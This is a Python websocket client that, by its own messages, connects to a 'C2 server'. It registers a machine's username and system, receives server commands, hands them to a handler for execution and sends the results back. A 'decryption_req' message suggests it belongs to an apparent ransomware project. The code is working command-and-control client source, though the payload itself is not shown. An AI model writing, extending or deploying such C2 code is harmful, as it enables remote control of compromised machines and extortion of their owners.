import os
import json
import asyncio
import websockets

class WebsocketClient:
    def __init__(self, username:str, system: str, handler, id: str = ""):
        from dotenv import load_dotenv
        load_dotenv()
        self.__host = os.getenv("SERVER_HOST", "localhost")
        self.__port = int(os.getenv("SERVER_PORT", "8765"))
        self.__websocket = None
        self.username = username
        self.system = system
        self.handler = handler
        self.id = id

    async def connect(self):
        uri = f"ws://{self.__host}:{self.__port}"


        async with websockets.connect(uri=uri, subprotocols=["json"]) as websocket:
            self.__websocket = websocket

            await websocket.send(self.__create_auth_req())
            auth_rep = await websocket.recv()
            id = self.__validate_auth_rep(auth_rep)

            if id is None:
                print("Authentication to server failed.")
                return
            
            print("Authentication successful in the C2 server.")

            self.handler({
                "type": "set_id",
                "data": {
                    "id": id
                }
            })

            await self.__start()

    def __create_auth_req(self):
        data = {
            "type": "auth_req",
            "data": {
                "username": self.username,
                "system": self.system,
                "id": self.id
            }
        }
        return json.dumps(data)
    
    def __validate_auth_rep(self, message):
        message_dic = json.loads(message)
        data = message_dic.get("data", {})
        if message_dic.get("type") == "auth_rep" and data.get("status") == True:
            return data.get("id", "")
        return None    
    
    async def __start(self):
        """This function listens for messages from the server and handles them to the handler in the MAIN program"""
        async for message in self.__websocket:
            print(f"\n[Server]: {message}")
            reply = self.handler(json.loads(message))
            if reply is not None:
                await self.send_message(reply)

    async def stop(self):
        """Closes the websocket connection."""
        if self.__websocket is not None:
            await self.__websocket.close()
            self.__websocket = None

    async def send_decryption_req(self):
        """Sends a decryption request to the server."""
        data = {
            "type": "decryption_req",
            "data": {
            }
        }
        await self.send_message(data)

    async def send_message(self, message: dict):
        """Sends a generic message to the server."""
        if self.__websocket is None:
            print("Websocket is not connected.")
            return
        
        await self.__websocket.send(json.dumps(message))

